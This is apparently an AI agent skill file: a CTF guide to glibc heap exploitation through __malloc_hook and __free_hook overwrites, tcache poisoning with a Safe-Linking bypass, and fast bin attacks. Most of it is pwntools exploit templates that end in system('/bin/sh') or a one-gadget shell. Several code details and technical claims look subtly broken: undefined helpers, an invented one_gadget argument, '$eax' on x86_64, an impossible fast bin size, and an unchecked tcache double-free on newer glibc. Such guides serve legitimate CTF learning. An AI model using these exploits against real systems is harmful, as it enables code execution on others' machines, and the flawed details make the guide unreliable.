---
name: malloc-hook-exploit
description: Guide for exploiting __malloc_hook and __free_hook in binary exploitation challenges. Use this skill when working on CTF pwn challenges involving heap vulnerabilities, malloc/free hook overwrites, tcache poisoning, or Safe-Linking bypasses. Trigger when the user mentions malloc hook, free hook, heap exploitation, glibc hooks, tcache poisoning, or is solving binary exploitation challenges that involve heap memory corruption.
---

# Malloc/Free Hook Exploitation Guide

This skill helps you exploit `__malloc_hook` and `__free_hook` vulnerabilities in binary exploitation challenges. These are powerful primitives for achieving arbitrary code execution through heap corruption.

## Quick Reference

| Hook | Triggered By | glibc Support |
|------|--------------|---------------|
| `__malloc_hook` | Any `malloc()` call | ≤ 2.33 |
| `__free_hook` | Any `free()` call | ≤ 2.33 |
| `__realloc_hook` | Any `realloc()` call | ≤ 2.33 |
| `__memalign_hook` | Any `memalign()` call | ≤ 2.33 |

> **⚠️ Critical**: Hooks are **disabled in glibc ≥ 2.34**. Check the target's glibc version first!

## Step 1: Check glibc Version

Before attempting hook exploitation, verify the target supports it:

```bash
# Check glibc version
ldd --version
# or
strings /lib/x86_64-linux-gnu/libc.so.6 | grep GLIBC_ | sort -V | tail -1
```

If glibc ≥ 2.34, hooks won't work. Pivot to alternatives like:
- IO-FILE structure hijacking
- `__run_exit_handlers` overwrites
- vtable spraying
- Return-to-libc with other function pointers

## Step 2: Locate Hook Addresses

### With Symbols (Debug Build)

```bash
# In GEF/Pwndbg
gef➤  p &__malloc_hook
gef➤  p &__free_hook
```

### Without Symbols

Use the `find_hook_address.py` script:

```bash
python3 scripts/find_hook_address.py /path/to/libc.so.6
```

Or manually in GDB:

```bash
# For __free_hook, break at free+25
gef➤  x/20i free
gef➤  break *free+25
gef➤  run
# $eax contains __free_hook address
```

## Step 3: Choose Your Attack Vector

### Option A: __malloc_hook Exploitation

**When to use**: You can trigger `malloc()` after overwriting the hook.

**Prerequisites**:
- Arbitrary write primitive (UAF, heap overflow, use-after-free)
- One Gadget or shellcode address
- Ability to trigger malloc (or use `printf("%10000$c")` to force it)

**Workflow**:

1. **Overwrite `__malloc_hook`** with a One Gadget address
2. **Trigger `malloc()`** - the gadget executes
3. **Get shell**

**Example**:

```python
from pwn import *

libc = ELF("libc.so.6")
p = process("./vuln")

# Get one gadget
one_gadget = one_gadget(libc.path, ret2ret=False)

# Overwrite __malloc_hook
malloc_hook = libc.sym['__malloc_hook']
write(malloc_hook, p64(one_gadget))

# Trigger malloc
p.sendline(b"malloc_trigger")

# Get shell
p.interactive()
```

### Option B: __free_hook Exploitation

**When to use**: You can trigger `free()` after overwriting the hook.

**Prerequisites**:
- Heap corruption primitive (fast bin attack, tcache poisoning, unsorted bin attack)
- `system` function address
- String `/bin/sh` in heap

**Workflow**:

1. **Overwrite `__free_hook`** with `system` address
2. **Place `/bin/sh`** in a heap chunk
3. **Free that chunk** - `system("/bin/sh")` executes

**Example**:

```python
from pwn import *

libc = ELF("libc.so.6")
p = process("./vuln")

# Overwrite __free_hook with system
free_hook = libc.sym['__free_hook']
write(free_hook, p64(libc.sym['system']))

# Create chunk with /bin/sh
bin_sh = malloc(0x50)
edit(bin_sh, b"/bin/sh\x00")

# Free it to trigger
free(bin_sh)

p.interactive()
```

## Step 4: Handle Safe-Linking (glibc 2.32-2.33)

glibc 2.32+ introduced **Safe-Linking** that obfuscates tcache forward pointers:

```c
#define PROTECT_PTR(pos, ptr) (((size_t)(pos) >> 12) ^ (size_t)(ptr))
#define REVEAL_PTR(ptr)       PROTECT_PTR(&ptr, ptr)
```

**Consequences**:
1. **Heap leak required** - you need `chunk_addr >> 12` to forge valid pointers
2. **Full 8-byte overwrites only** - partial writes fail the check

**Tcache Poisoning with Safe-Linking**:

```python
from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process("./vuln")

# 1. Leak heap address
heap_leak = u64(p.recvuntil(b"\n")[:6].ljust(8, b"\x00"))
heap_base = heap_leak & ~0xfff
fd_key = heap_base >> 12  # Safe-Linking key
log.success(f"heap @ {hex(heap_base)}")

# 2. Double-free for tcache poisoning
a = malloc(0x48)
b = malloc(0x48)
free(a)
free(b)
free(a)  # tcache double-free

# 3. Forge obfuscated fd pointing to __free_hook
free_hook = libc.sym['__free_hook']
poison = free_hook ^ fd_key
edit(a, p64(poison))

# 4. Two mallocs - second returns __free_hook
malloc(0x48)  # returns chunk a
c = malloc(0x48)  # returns chunk @ __free_hook
edit(c, p64(libc.sym['system']))

# 5. Trigger
bin_sh = malloc(0x48)
edit(bin_sh, b"/bin/sh\x00")
free(bin_sh)

p.interactive()
```

## Step 5: Fast Bin Attack for __free_hook

When you need to place a chunk at `__free_hook`:

1. **Find chunk size** that fits near `__free_hook`:
   ```bash
   gef➤  p &__free_hook
   $1 = 0x7ff1e9e607a8
   gef➤  x/60gx 0x7ff1e9e607a8 - 0x59
   # Look for 0x0000000000000200 (size 0x200)
   ```

2. **Create fast bin chunk** of matching size:
   ```python
   # Create chunk of size 0xfc, merge twice = 0x1f8
   chunk = malloc(0xfc)
   merge(chunk)  # twice
   ```

3. **Poison fd** to point to `__free_hook` location

4. **Allocate** to get chunk at `__free_hook`

5. **Overwrite** with `system` address

6. **Free** a chunk containing `/bin/sh`

## Common Pitfalls

| Issue | Solution |
|-------|----------|
| glibc ≥ 2.34 | Use alternative primitives (IO-FILE, vtable) |
| Safe-Linking fails | Leak heap address, use `chunk_addr >> 12` as XOR key |
| Partial overwrite fails | Safe-Linking requires full 8-byte pointer |
| Hook not triggering | Verify hook address is correct, check for ASLR |
| Segfault after overwrite | Ensure gadget/function address is valid |

## Debugging Tips

```bash
# In GDB, watch hook values
gef➤  watch *(&__malloc_hook)
gef➤  watch *(&__free_hook)

# Check if hooks are enabled
gef➤  p __malloc_hook
gef➤  p __free_hook
# If they show 0x0, hooks are disabled

# Trace malloc/free calls
gef➤  break malloc
gef➤  break free
```

## When Hooks Don't Work (glibc ≥ 2.34)

If hooks are disabled, try these alternatives:

1. **IO-FILE Hijacking**: Overwrite FILE structure vtable
2. **`__run_exit_handlers`**: Overwrite exit handler function pointer
3. **vtable Spraying**: Overwrite C++ vtable entries
4. **Return-to-libc**: Chain libc functions directly
5. **ROP**: Build ROP chain to achieve code execution

See: [https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md)

## Quick Start Script

Use `scripts/exploit_template.py` as a starting point:

```bash
python3 scripts/exploit_template.py --help
```

This generates a template with:
- glibc version check
- Hook address discovery
- Exploitation workflow
- Interactive shell

## References

- [GNU libc Hooks Documentation](https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html)
- [Safe-Linking Research (Check Point, 2020)](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/)
- [Modern libc Exploitation](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md)
- [One Gadget](https://github.com/david942j/one_gadget)

---

**Remember**: Always verify glibc version before attempting hook exploitation. Modern systems (Ubuntu 22.04+, Fedora 35+, Debian 12) use glibc ≥ 2.34 where hooks are disabled.
